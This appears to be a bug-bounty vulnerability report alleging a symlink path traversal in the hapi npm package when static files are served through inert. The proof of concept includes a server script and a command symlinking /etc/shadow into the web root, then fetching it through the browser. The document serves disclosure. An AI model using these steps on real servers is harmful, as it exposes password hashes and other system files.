<!-- Thanks for contributing to huntr! -->
I would like to report Path traversal via Symlink in hapi npm package.

Module module name: hapi/hapi version: 19.1.1 npm page: https://www.npmjs.com/package/@hapi/hapi

Description: 
With a symbolically linked file in the working directory, it is possible to read arbitrary files outside of the web root directory.

PoC: 
1. Install the hapi: **npm i @hapi/hapi**
2. Run the server as: **node static_server.js**. 
Mentioning the code for static_server.js file below -

`const Path = require('path');
const Hapi = require('@hapi/hapi');
const Inert = require('@hapi/inert');

const init = async () => {

    const server = new Hapi.Server({
	host: 'localhost',
        port: 3000,
        routes: {
            files: {
                relativeTo: Path.join(__dirname, 'public')
            }
        }
    });

    await server.register(Inert);

    server.route({
        method: 'GET',
        path: '/{param*}',
        handler: {
            directory: {
                path: '.',
                redirectToSlash: true
            }
        }
    });

    await server.start();

    console.log('Server running at:', server.info.uri);
};

init();`

3. Create a symlink file within the directory ln -s /etc/shadow test_shadow.html
4. Request the file within browser http://localhost:3000/test_shadow.html

Recommendation: 
Reject the symbolically linked path files.
